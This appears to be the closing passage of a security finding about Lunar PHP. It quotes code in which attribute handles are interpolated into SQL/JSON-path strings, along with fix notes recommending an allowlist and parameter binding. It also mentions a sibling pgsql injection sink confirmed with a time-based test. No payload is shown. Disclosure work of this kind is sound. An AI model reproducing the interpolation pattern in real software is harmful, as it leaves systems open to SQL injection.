        ->whereSearchable(true)
        ->get();

    foreach ($attributes as $attribute) {
        if ($attribute->type == TranslatedText::class) {
            array_push($map, 'attribute_data->'.$attribute->handle.'->value');
        }
    }

    return $map;
}
```

```php
# File: vendor/lunarphp/lunar/src/Filament/Resources/AttributeGroupResource/RelationManagers/AttributesRelationManager.php
# Lines: 56-65
Forms\Components\TextInput::make('handle')
    ->label(__('lunarpanel::attribute.form.handle.label'))
    ->dehydrated()
    ->unique(ignoreRecord: true, modifyRuleUsing: function (Unique $rule, RelationManager $livewire) {
        return $rule->where('attribute_group_id', $livewire->ownerRecord->id);
    })->disabled(
        fn (?Model $record) => (bool) $record
    )
    ->required(),
```

### Fix notes

- Validate attribute `handle` with a strict allowlist (e.g. `^[a-z0-9_]+$`) on create/update.
- Never interpolate `handle` into SQL/JSON-path strings; bind or use a safe path builder.
- Also bind IDs in `Builder::orderBySequence()` for the pgsql `CASE WHEN id = $id` branch (sibling sink, same release; tinker time-based ~3s; HTTP path needs Scout keys; not counted as this finding).
